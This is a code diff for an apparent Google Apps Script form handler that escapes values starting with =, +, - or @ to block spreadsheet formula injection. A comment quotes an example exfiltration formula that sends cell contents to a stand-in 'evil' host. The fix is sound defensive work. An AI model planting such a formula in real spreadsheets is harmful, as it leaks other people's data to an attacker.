@@ -59,11 +59,25 @@ function columnIndexMap(sheet) {
   return map;
 }
 
+// Range.setValue() parses strings the same way the Sheets UI does, so a
+// value starting with =, +, -, or @ becomes a formula instead of literal
+// text. Since doPost accepts arbitrary JSON, every string must be escaped
+// before it's written, or a submission could plant a formula (e.g.
+// =IMAGE("https://evil/"&A1&B1)) that exfiltrates other guests' data or
+// phishes whoever opens the sheet.
+var FORMULA_TRIGGER_CHARS = ["=", "+", "-", "@"];
+
+function sanitizeForSheet(value) {
+  if (typeof value !== "string" || value.length === 0) return value;
+  if (FORMULA_TRIGGER_CHARS.indexOf(value.charAt(0)) === -1) return value;
+  return "'" + value;
+}
+
 function appendRow(sheet, map, data) {
   var rowIndex = sheet.getLastRow() + 1;
   Object.keys(data).forEach(function (key) {
     if (!(key in map)) return;
-    sheet.getRange(rowIndex, map[key] + 1).setValue(data[key]);
+    sheet.getRange(rowIndex, map[key] + 1).setValue(sanitizeForSheet(data[key]));
   });
 }
 
